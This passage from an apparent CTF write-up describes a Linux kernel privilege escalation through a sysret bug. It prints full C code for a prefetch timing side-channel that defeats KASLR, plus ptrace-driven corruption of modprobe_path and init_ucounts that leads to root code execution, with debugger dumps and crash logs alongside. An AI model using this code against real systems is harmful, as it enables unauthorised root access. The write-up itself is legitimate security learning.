<p>Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gsbase be set from user space via the wrgsbase instruction!</p>

<p><code class="language-plaintext highlighter-rouge">asm volatile("wrgsbase %0" : : "r" (gsbase));</code></p>

<p>So if I just use this instruction to modify user space gsbase in the process triggering the sysret bug and I should survive the fault!</p>

<p>Except… not quite. I first tried setting it to a random read/write kernel address and that got me a little further, but the percpu data contains pointers that the kernel will try to dereference which just becomes double faulting again.</p>

<p>So setting it to some random address wasn’t going to cut it, I figured the most stable option would be to just set user space gsbase to kernel gsbase so that when the vulnerability triggered the kernel would be running with the gsbase it expected.</p>

<p>One small problem, kernel gsbase is in physmap… how am I supposed to know where that is? and while I’m at it how am I supposed to know where the kernel itself is? I had been debugging with KASLR disabled, but for remote I’ll need leaks somehow…</p>

<h2 id="breaking-kaslr">Breaking KASLR</h2>

<p>So given that triggering the vulnerability will crash the system if the address pointed to by stack pointer is unmapped or gsbase is wrong, how can KASLR be broken independent of this vulnerability? the answer lies in the micro-architecture.</p>

<p>KASLR has been publicly broken for all Intel cpus since 2016. The techinque was discovered by Gruss et al. in 2016 and is referred to as a <a href="https://gruss.cc/files/prefetch.pdf">Prefetch Attack</a> as it relies on the timing variance of the x86 <code class="language-plaintext highlighter-rouge">prefetch</code> instructions when executed against cached kernel address translations.</p>

<p>For a simple implementation of a prefetch attack I reached for the <a href="https://www.willsroot.io/2022/12/entrybleed.html">entrybleed poc</a>, which is just a specific use of a prefetch attack for breaking KASLR when KPTI is enabled but the same code works with KPTI disabled as well. This was enough to break KASLR of the kernel image, but I still needed to break physmap KASLR to be able to survive the use of percpu variables…</p>

<p>But that was simple enough, all I had to do was define some ranges and step sizes that work for physmap and add a flag to choose which randomization I want to break.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// largely based on: https://www.willsroot.io/2022/12/entrybleed.html</span>

<span class="cp">#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
</span>
<span class="cp">#define STEP_KERNEL 0x100000ull
#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL
</span>
<span class="cp">#define PHYS_LOWER_BOUND 0xffff888000000000ull
#define PHYS_UPPER_BOUND 0xfffffe0000000000ull
</span>
<span class="cp">#define STEP_PHYS 0x40000000ull
#define SCAN_START_PHYS PHYS_LOWER_BOUND
#define SCAN_END_PHYS PHYS_UPPER_BOUND
#define ARR_SIZE_PHYS (SCAN_END_PHYS - SCAN_START_PHYS) / STEP_PHYS
</span>
<span class="cp">#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
</span>
<span class="kt">uint64_t</span> <span class="nf">sidechannel</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">uint64_t</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">;</span>
  <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">".intel_syntax noprefix;"</span>
    <span class="s">"mfence;"</span>
    <span class="s">"rdtscp;"</span>
    <span class="s">"mov %0, rax;"</span>
    <span class="s">"mov %1, rdx;"</span>
    <span class="s">"xor rax, rax;"</span>
    <span class="s">"lfence;"</span>
    <span class="s">"prefetchnta qword ptr [%4];"</span>
    <span class="s">"prefetcht2 qword ptr [%4];"</span>
    <span class="s">"xor rax, rax;"</span>
    <span class="s">"lfence;"</span>
    <span class="s">"rdtscp;"</span>
    <span class="s">"mov %2, rax;"</span>
    <span class="s">"mov %3, rdx;"</span>
    <span class="s">"mfence;"</span>
    <span class="s">".att_syntax;"</span>
    <span class="o">:</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">d</span><span class="p">)</span>
    <span class="o">:</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">addr</span><span class="p">)</span>
    <span class="o">:</span> <span class="s">"rax"</span><span class="p">,</span> <span class="s">"rbx"</span><span class="p">,</span> <span class="s">"rcx"</span><span class="p">,</span> <span class="s">"rdx"</span><span class="p">);</span>
  <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">a</span><span class="p">;</span>
  <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">c</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="n">a</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">prefetch</span><span class="p">(</span><span class="kt">int</span> <span class="n">phys</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">arr_size</span> <span class="o">=</span> <span class="n">ARR_SIZE_KERNEL</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">scan_start</span> <span class="o">=</span> <span class="n">SCAN_START_KERNEL</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">step_size</span> <span class="o">=</span> <span class="n">STEP_KERNEL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">phys</span><span class="p">)</span> <span class="p">{</span>
	    <span class="n">arr_size</span> <span class="o">=</span> <span class="n">ARR_SIZE_PHYS</span><span class="p">;</span>
	    <span class="n">scan_start</span> <span class="o">=</span> <span class="n">SCAN_START_PHYS</span><span class="p">;</span>
	    <span class="n">step_size</span> <span class="o">=</span> <span class="n">STEP_PHYS</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">arr_size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">arr_size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>

    <span class="kt">uint64_t</span> <span class="n">min</span> <span class="o">=</span> <span class="o">~</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="o">~</span><span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ITERATIONS</span> <span class="o">+</span> <span class="n">DUMMY_ITERATIONS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">arr_size</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">uint64_t</span> <span class="n">test</span> <span class="o">=</span> <span class="n">scan_start</span> <span class="o">+</span> <span class="n">idx</span> <span class="o">*</span> <span class="n">step_size</span><span class="p">;</span>
            <span class="n">syscall</span><span class="p">(</span><span class="mi">104</span><span class="p">);</span>
            <span class="kt">uint64_t</span> <span class="n">time</span> <span class="o">=</span> <span class="n">sidechannel</span><span class="p">(</span><span class="n">test</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="n">DUMMY_ITERATIONS</span><span class="p">)</span>
                <span class="n">data</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">+=</span> <span class="n">time</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">arr_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">/=</span> <span class="n">ITERATIONS</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">min</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">min</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">scan_start</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="n">step_size</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"KERNEL base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"PHYS base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And boom! KASLR in shambles!</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~<span class="nv">$ </span>/tmp/exploit
KASLR base ffffffffb5c00000
PHYS base ffff8d9000000000
</code></pre></div></div>

<h2 id="escalating-privileges">escalating privileges</h2>

<p>With KASLR broken I could set gsbsase to its original value before which gave me a fairly stable way to trigger the sysret bug and survive.</p>

<p>So now the goal is to use the memory corruption from the <code class="language-plaintext highlighter-rouge">error_entry</code> function I mentioned previously to corrupt some kernel memory with controlled values. I figured that the easiest target would be overwriting <code class="language-plaintext highlighter-rouge">modprobe_path</code>, a great description of this techinque can be found <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">here</a>. Basically overwriting this kernel variable with a path to a file I control the contents of will lead to it being executed as root when a file with an unrecognized header is executed.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>

    <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
    <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"KASLR base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"PHYS base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys</span><span class="p">);</span>

    <span class="n">gsbase</span> <span class="o">=</span> <span class="n">phys</span> <span class="o">+</span> <span class="mh">0x13bc00000</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"gsbase: %#lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">gsbase</span><span class="p">);</span>

    <span class="c1">// create trigger file for modprobe</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne </span><span class="se">\"\xff\xff\xff\xff\"</span><span class="s"> &gt;&gt; /tmp/bad"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod 777 /tmp/bad"</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kaslr</span> <span class="o">+</span> <span class="mh">0x103b840</span><span class="p">;</span>

    <span class="c1">// fill registers with new modprobe path</span>
    <span class="kt">uint64_t</span> <span class="n">new_modprobe</span> <span class="o">=</span> <span class="mh">0x0000612f706d742f</span><span class="p">;</span> <span class="c1">// /tmp/a</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">regs</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">new_modprobe</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	    <span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_modprobe</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// position register dump over modprobe_path</span>
    <span class="n">do_sysret</span><span class="p">(</span><span class="n">modprobe_path</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>I setup the ptrace registers to be filled with the bytes b”/tmp/a\0\0” to overwrite the default <code class="language-plaintext highlighter-rouge">modprobe_path</code> and triggered the sysret bug with a stack pointer that cause the registers are pushed on top of the <code class="language-plaintext highlighter-rouge">modprobe_path</code> variable.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/20gx &amp;modprobe_path
0xffffffff8203b840 &lt;modprobe_path&gt;:     0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b850 &lt;modprobe_path+16&gt;:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b860 &lt;modprobe_path+32&gt;:  0x0000612f706d742f      0x0000000000000246
0xffffffff8203b870 &lt;modprobe_path+48&gt;:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b880 &lt;modprobe_path+64&gt;:  0x0000612f706d742f      0x0000000000000052
0xffffffff8203b890 &lt;modprobe_path+80&gt;:  0x8000000000000000      0x0000612f706d742f
0xffffffff8203b8a0 &lt;modprobe_path+96&gt;:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b8b0 &lt;modprobe_path+112&gt;: 0xffffffffffffffff      0xffffffff81a00191
0xffffffff8203b8c0 &lt;modprobe_path+128&gt;: 0x0000000000000010      0x0000000000010046
0xffffffff8203b8d0 &lt;modprobe_path+144&gt;: 0xffffffff8203b8e8      0x0000000000000018
gef➤  x/s &amp;modprobe_path
0xffffffff8203b840 &lt;modprobe_path&gt;:     "/tmp/a"
</code></pre></div></div>

<p>Incredibly, nothing crashed… yet…</p>

<p>I had created a file at /tmp/a to be executed when I ran the trigger file with a bad header, but when I executed it a page fault occurred and prevented the file at the hijacked modprobe path from being executed…</p>

<p>It turns out I had corrupted more than just modprobe path… at this point I tried a bunch of different offsets of the <code class="language-plaintext highlighter-rouge">modprobe_path</code> variable hoping one of them might ‘just work’ but had no such luck, I even gave up on <code class="language-plaintext highlighter-rouge">modprobe_path</code> at one point and started exploring hijacking <code class="language-plaintext highlighter-rouge">core_pattern</code> and even seeing if I could safely corrupt a cred struct. None of those ended up working out, for a brief second I considered that maybe I should stop being lazy and just rop. But then I had another idea, what if I could just fix the corruption… with more corruption?</p>

<p>Lets take a closer at what was going wrong when I tried to corrupt <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>

<p>This is the trace the kernel prints when I tried to trigger modprobe:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[    5.095502] BUG: unable to handle page fault for address: ffffffff00000208
[    5.096822] #PF: supervisor read access in kernel mode
[    5.098019] #PF: error_code(0x0000) - not-present page
[    5.098661] PGD 202e067 P4D 202e067 PUD 0
[    5.099171] Oops: 0000 [#2] PREEMPT SMP NOPTI
[    5.099704] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
[    5.100631] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.2-1-1 04/014
[    5.101765] Workqueue: events_unbound call_usermodehelper_exec_work
[    5.102522] RIP: 0010:inc_rlimit_ucounts+0x31/0x70
[    5.103129] Code: f0 48 89 f9 45 31 d2 49 b9 ff ff ff ff ff ff ff 7f 4a 8d 34 c5 70 00 00 00 49 83 8
[    5.105340] RSP: 0018:ffffc900000e3cb8 EFLAGS: 00010282
[    5.105977] RAX: ffffffff00000028 RBX: ffff888100964ec0 RCX: ffffffff8203b6c0
[    5.106850] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
[    5.107914] RBP: ffffffff8203b6c0 R08: 0000000000000046 R09: 7fffffffffffffff
[    5.108776] R10: 7fffffffffffffff R11: 0000000000000025 R12: 0000000000000000
[    5.110192] R13: ffffc900000e3df0 R14: 00000000ffffffff R15: 0000000000800100
[    5.111701] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[    5.112934] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.113974] CR2: ffffffff00000208 CR3: 0000000100ad2002 CR4: 0000000000370ef0
[    5.115356] Call Trace:
[    5.115679]  &lt;TASK&gt;
[    5.115953]  copy_creds+0xb8/0x160
[    5.116388]  copy_process+0x3c6/0x19b0
[    5.116860]  kernel_clone+0x96/0x350
[    5.117313]  ? update_load_avg+0x5f/0x610
[    5.117814]  ? update_load_avg+0x5f/0x610
[    5.118316]  user_mode_thread+0x56/0x80
[    5.118788]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
[    5.119512]  call_usermodehelper_exec_work+0x2a/0x80
[    5.120120]  process_one_work+0x1b1/0x340
[    5.120616]  worker_thread+0x45/0x3b0
[    5.121063]  ? __pfx_worker_thread+0x10/0x10
[    5.121603]  kthread+0xd1/0x100
[    5.121996]  ? __pfx_kthread+0x10/0x10
[    5.122464]  ret_from_fork+0x29/0x50
[    5.122923]  &lt;/TASK&gt;
</code></pre></div></div>

<p>It crashed somewhere in <code class="language-plaintext highlighter-rouge">inc_rlimit_ucounts</code>, I had no clue why so I set a breakpoint at it, restarted the vm, and ran tried to trigger the bug again.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffffff8109e9b1 in inc_rlimit_ucounts ()
   0xffffffff8109e9a6 &lt;inc_rlimit_ucounts+38&gt; cmp    rdi, rcx
   0xffffffff8109e9a9 &lt;inc_rlimit_ucounts+41&gt; cmove  r10, rax
   0xffffffff8109e9ad &lt;inc_rlimit_ucounts+45&gt; mov    rax, QWORD PTR [rcx+0x10]
 → 0xffffffff8109e9b1 &lt;inc_rlimit_ucounts+49&gt; mov    rcx, QWORD PTR [rax+0x1e0]
   0xffffffff8109e9b8 &lt;inc_rlimit_ucounts+56&gt; mov    r9, QWORD PTR [rax+r8*8+0x8]
   0xffffffff8109e9bd &lt;inc_rlimit_ucounts+61&gt; test   rcx, rcx
   0xffffffff8109e9c0 &lt;inc_rlimit_ucounts+64&gt; je     0xffffffff8109e9e4 &lt;inc_rlimit_ucounts+100&gt;
   0xffffffff8109e9c2 &lt;inc_rlimit_ucounts+66&gt; mov    rax, rdx
   0xffffffff8109e9c5 &lt;inc_rlimit_ucounts+69&gt; ds     xadd QWORD PTR [rcx+rsi*1], rax
</code></pre></div></div>

<p>This instruction is what crashes, it is dereferencing some value it got from the address in rcx, so what is rcx?</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/20gx $rcx
0xffffffff8203b6c0 &lt;init_ucounts&gt;:      0x0000000000000000      0xffffffff810c50b3
0xffffffff8203b6d0 &lt;init_ucounts+16&gt;:   0xffffffff00000028      0x000000008203b730
0xffffffff8203b6e0 &lt;init_ucounts+32&gt;:   0xffffffff8203b6f0      0x18581c54482e2a00
0xffffffff8203b6f0 &lt;init_ucounts+48&gt;:   0x18581c54482e2a00      0xffffffff81e99724
0xffffffff8203b700 &lt;init_ucounts+64&gt;:   0x00007fffade979fc      0x0000000100ad0001
0xffffffff8203b710 &lt;init_ucounts+80&gt;:   0x0000000000370ef0      0xffffffff8203b5f0
0xffffffff8203b720 &lt;init_ucounts+96&gt;:   0xffffffff81e99724      0xffffffff81024f2d
0xffffffff8203b730 &lt;init_ucounts+112&gt;:  0xffff88813bc00001      0x000000000000016e
0xffffffff8203b740 &lt;init_ucounts+128&gt;:  0x0000000080050033      0x0000000000000046
</code></pre></div></div>

<p>Looks like rcx is the address of <code class="language-plaintext highlighter-rouge">init_ucounts</code> I don’t really know what this is for, but I see a user space stack address in there so I’m guessing I accidentally corrupted this…</p>

<p>And it is right up against <code class="language-plaintext highlighter-rouge">modprobe_path</code>, so definitely my fault.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p/x (void*)&amp;modprobe_path - (void*)&amp;init_ucounts
$17 = 0x180
</code></pre></div></div>

<p>So I figured what if I could just use more corruption by triggering the sysret bug again to uncorrupt <code class="language-plaintext highlighter-rouge">init_ucounts</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; x/20gx &amp;init_ucounts
0xffffffff8203b6c0 &lt;init_ucounts&gt;:      0xffff888100049600	0xffffffff82640160
0xffffffff8203b6d0 &lt;init_ucounts+16&gt;:	0xffffffff8203a320	0x0000002f00000000
0xffffffff8203b6e0 &lt;init_ucounts+32&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b6f0 &lt;init_ucounts+48&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b700 &lt;init_ucounts+64&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b710 &lt;init_ucounts+80&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b720 &lt;init_ucounts+96&gt;:	0x0000000000000000	0x0000000000000000
0xffffffff8203b730 &lt;init_ucounts+112&gt;:	0x000000000000002a	0x0000000000000000
0xffffffff8203b740 &lt;init_ucounts+128&gt;:	0x0000000000000000	0x0000000000000000
</code></pre></div></div>

<p>Above is what <code class="language-plaintext highlighter-rouge">init_ucounts</code> looks like just after boot, I just had to make it look somewhat like that again hopefully the faults would just go away.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
    <span class="c1">// fixup corrupted init_ucounts</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x0000002d00000000</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r12</span> <span class="o">=</span> <span class="n">kaslr</span> <span class="o">+</span> <span class="mh">0x103a320</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r13</span> <span class="o">=</span> <span class="n">kaslr</span> <span class="o">+</span> <span class="mh">0x1640160</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">r14</span> <span class="o">=</span> <span class="n">phys</span> <span class="o">+</span> <span class="mh">0x100049600</span><span class="p">;</span>

    <span class="c1">// position register dump over init_ucounts</span>
    <span class="n">do_sysret</span><span class="p">(</span><span class="n">modprobe_path</span><span class="o">-</span><span class="mh">0xd8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
<span class="p">...</span>
</code></pre></div></div>

<p>I set up the regisers for ptrace so that the four qwords that are actually set would be set back to their initial values, and gave it a go:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; x/20gx &amp;init_ucounts
0xffffffff8203b6c0 &lt;init_ucounts&gt;:      0xffff888100049600      0xffffffff82640160
0xffffffff8203b6d0 &lt;init_ucounts+16&gt;:   0xffffffff8203a320      0x0000002e00000000
0xffffffff8203b6e0 &lt;init_ucounts+32&gt;:   0x0000612f706d742f      0x0000000000000246
0xffffffff8203b6f0 &lt;init_ucounts+48&gt;:   0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b700 &lt;init_ucounts+64&gt;:   0x0000612f706d742f      0x0000000000000054
0xffffffff8203b710 &lt;init_ucounts+80&gt;:   0x8000000000000000      0x0000612f706d742f
0xffffffff8203b720 &lt;init_ucounts+96&gt;:   0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b730 &lt;init_ucounts+112&gt;:  0xffffffffffffffff      0xffffffff81a00191
0xffffffff8203b740 &lt;init_ucounts+128&gt;:  0x0000000000000010      0x0000000000010046
</code></pre></div></div>

<p>Well, it looks horrible but maybe it is close enough? hopefully?</p>

<p>So I tried triggering my hijacked <code class="language-plaintext highlighter-rouge">modprobe_path</code> again, and…</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~$ /sysret
KASLR base ffffffff81000000
PHYS base ffff888000000000
gsbase: 0xffff88813bc00000
[    5.115530] general protection fault, maybe for address 0x51: 0000 [#1] PREEMPT SMP NOPTI
...
[    5.150788] general protection fault, maybe for address 0x53: 0000 [#2] PREEMPT SMP NOPTI
...
ctf@corctf:~$ /tmp/bad
/tmp/bad: line 1: : not found
</code></pre></div></div>

<p>I… didn’t crash? It actually worked!?!</p>

<p>I went ahead and added a few more lines to my exploit to automatically create /tmp/a which will copy the flag to /tmp where I can read it.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// called by modprobe</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne </span><span class="se">\"</span><span class="s">#!/bin/sh</span><span class="se">\n</span><span class="s">cp /root/flag.txt /tmp/heckyeah</span><span class="se">\n</span><span class="s">chown ctf:ctf /tmp/heckyeah</span><span class="se">\"</span><span class="s"> &gt; /tmp/a"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod 777 /tmp/a"</span><span class="p">);</span>

    <span class="p">...</span>

    <span class="c1">// trigger modprobe</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/tmp/bad"</span><span class="p">);</span>

    <span class="c1">// get flag</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /tmp/heckyeah"</span><span class="p">);</span>
<span class="err">}</span>
</code></pre></div></div>

<p>I tried running this locally and was able to the get the test flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~$ /sysret
KASLR base ffffffff81000000
PHYS base ffff888000000000
gsbase: 0xffff88813bc00000
...
/tmp/bad: line 1: : not found
corctf{test_flag}
ctf@corctf:~$
</code></pre></div></div>

<p>Now to try it on remote!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@corctf:~$ chmod +x /tmp/exploit
ctf@corctf:~$ /tmp/exploit
KASLR base ffffffffb5c00000
PHYS base ffff8d9000000000
gsbase: 0xffff8d913bc00000
[   93.372874] general protection fault, maybe for address 0x54: 0000 [#1] PREEMPT SMP NOPTI
[   93.373374] CPU: 0 PID: 83 Comm: exploit Not tainted 6.3.4 #14
[   93.373717] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.374277] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.374601] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 &lt;48&gt; 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.375677] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.375988] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.376409] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.376825] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.377248] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.377666] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
